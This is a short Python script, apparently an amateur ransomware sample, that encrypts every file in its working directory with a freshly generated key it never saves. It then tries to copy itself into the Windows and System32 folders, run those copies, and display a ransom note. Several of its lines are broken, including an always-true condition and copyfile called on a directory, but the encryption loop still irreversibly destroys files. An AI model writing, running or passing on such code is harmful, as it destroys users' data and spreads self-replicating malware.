from cryptography.fernet import Fernet #imports cryptography library
import glob # imports library to find targets
import os # imports library to use shell
import shutil #imports library to replicate


#initializes cryptography key
key = Fernet.generate_key()
f = Fernet(key)

#--------core features-------
txt = glob.glob("*.*") #makes a list of all files in the current directory
for p in txt: #opens one object and saves it to p after repeating the loop,
    #it finds another file and saves it to p
    file = open(p,"r") #opens file with read permission
    content = file.readlines() #reads contents
    file.close() #closes file
    content = str(content) # converts the contents to a string (because it is a list)
    content = content.encode() #encodes it to become base64 for encryption
    newcontent = f.encrypt(content) #encrypts content
    newcontent = str(newcontent) #converts the content into string
    with open(p,"w+") as w: #opens the file again with writing permission
        w.writelines(newcontent) #writes the new encrypted content into the file 
        w.close() #closes the file
        
#--replication to important directories---
if os.getcwd() != "C:/Windows/System32" or os.getcwd() != "C:/Windows":
    shutil.copyfile(os.getcwd(),"C:\Windows\System32") #copies the file to System32 Folder (very important folder)
    os.system("start C:\Windows\System32\sneaky_dog_2.py") #runs the System32 clone
    shutil.copyfile(os.getcwd(),"C:/Windows/") # copies the file to Windows Folder (very important Folder)
    os.system("start C:\Windows\sneaky_dog_2.py") # runs Windows clone

#displays ransom message                
os.system("echo imagine getting your files encrypted>ransom.txt")
os.system("start ransom.txt")



    
